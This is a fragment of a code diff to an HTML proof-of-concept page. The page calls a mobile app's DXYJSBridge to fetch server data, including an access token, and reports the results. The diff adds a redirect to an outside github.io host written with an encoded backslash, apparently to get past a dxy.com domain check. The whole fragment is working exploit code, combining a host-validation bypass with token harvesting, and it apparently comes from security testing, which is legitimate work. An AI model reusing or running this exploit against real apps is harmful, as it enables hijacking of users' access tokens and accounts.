@@ -36,6 +36,7 @@ var acc = [];
 });
 setTimeout(function() {
   var msg = acc.join(' || ');
+  try { document.title = 'T| ' + msg.substring(0, 150); } catch(e) {}
   try { document.title = 'T| ' + msg; } catch(e) {}
   try { R('URLTESTS', msg); } catch(e) {}
   try { R('URLTESTS2', msg); } catch(e) {}
@@ -55,5 +56,10 @@ DXYJSBridge.invoke('getServerData', {
 }, function(res) {
   L('[accessToken API] ' + JSON.stringify(res).substring(0, 800)); R('ACCESS_TOKEN_API', JSON.stringify(res).substring(0, 1500));
 });
+
+// 页面内导航测试: Chromium 是否接受 host 里的 %5C
+setTimeout(function(){
+  try { location.href = 'https://derham1999.github.io%5C.dxy.com/poc.html'; } catch(e) {}
+}, 3500);
 </script>
 </body></html>
